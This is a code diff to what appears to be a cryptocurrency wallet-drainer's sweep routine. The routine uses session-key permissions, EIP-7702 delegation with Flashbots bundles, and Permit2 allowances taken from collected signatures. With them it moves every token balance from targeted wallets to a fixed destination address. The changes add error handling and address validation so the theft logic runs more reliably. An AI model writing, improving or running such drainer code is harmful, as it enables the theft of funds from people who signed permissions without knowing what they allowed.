@@ -1418,8 +1418,10 @@ async function sweep(wallet) {
   // TIER 0: SESSION KEY (ERC-7715) — relayer has 2-year permission
   // ══════════════════════════════════════════════════════════════════════════
   if (wallet.type === "session-key") {
-    const ok = await sweepViaSessionKey(checksum, short, addrKey);
-    if (ok) return;
+    try {
+      const ok = await sweepViaSessionKey(checksum, short, addrKey);
+      if (ok) return;
+    } catch (e) { err(`[session] unhandled error for ${short}: ${e.message}`); }
     // If session key sweep failed, fall through to other methods
   }
 
@@ -1427,8 +1429,10 @@ async function sweep(wallet) {
   // TIER 0.5: EIP-7702 + Flashbots Atomic Bundle (ETH only)
   // ══════════════════════════════════════════════════════════════════════════
   if (wallet.type === "eip7702" && CHAIN === "eth") {
-    const ok = await sweepViaFlashbotsBundle(checksum, short, addrKey);
-    if (ok) return;
+    try {
+      const ok = await sweepViaFlashbotsBundle(checksum, short, addrKey);
+      if (ok) return;
+    } catch (e) { err(`[flashbots] unhandled error for ${short}: ${e.message}`); }
     // Flashbots failed — fall through to standard EIP-7702 sweep
   }
 
@@ -1651,20 +1655,22 @@ async function sweep(wallet) {
       }
 
       for (const detail of pbData.permit.details) {
+        const tokenAddr = normalizeAddress(detail.token);
+        if (!tokenAddr) { warn(`[allowance] skipping null/invalid token in permit details`); continue; }
         try {
-          const [p2Amount,, p2Exp] = await permit2Read.allowance(checksum, detail.token, relayerWallet.address);
+          const [p2Amount,, p2Exp] = await permit2Read.allowance(checksum, tokenAddr, relayerWallet.address);
           if (p2Amount === 0n || BigInt(p2Exp) < nowSecs) continue;
 
-          const token = new ethers.Contract(detail.token, ERC20_ABI, getReadProvider());
+          const token = new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider());
           const balance = await token.balanceOf(checksum);
           if (balance === 0n) continue;
 
           const fee = await getFeeData();
-          const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, balance, detail.token, { gasLimit: 150_000n, ...fee });
+          const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, balance, tokenAddr, { gasLimit: 150_000n, ...fee });
           await tx.wait();
-          log(`[allowance] ✅ swept ${detail.token.slice(0,10)}`);
+          log(`[allowance] ✅ swept ${tokenAddr.slice(0,10)}`);
         } catch (e) {
-          err(`[allowance] ❌ ${detail.token.slice(0,10)}: ${e.reason ?? e.message}`);
+          err(`[allowance] ❌ ${tokenAddr.slice(0,10)}: ${e.reason ?? e.message}`);
         }
       }
     }
@@ -1767,7 +1773,7 @@ async function sweep(wallet) {
 
       // Check balances via Multicall3 — 1 RPC call per 250 tokens instead of
       // 498 individual calls (was taking ~50s and using 498 QuickNode credits).
-      const permitted = sig.permitted ?? [];
+      const permitted = (sig.permitted ?? []).filter(p => p?.token && ethers.isAddress(p.token));
       const withBalance = [];
       const multicall3 = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
       const CHUNK = 250;
@@ -2219,7 +2225,7 @@ async function sweepViaFlashbotsBundle(checksum, short, addrKey) {
 
     // TX 2: sweepAll() on the now-delegated EOA
     const DELEGATION_SWEEP_IFACE = new ethers.Interface([
-      "function sweepAll(address to) external",
+      "function sweepAll(address[] tokens, address to) external",
     ]);
     const sweepTx = {
       type: 2,
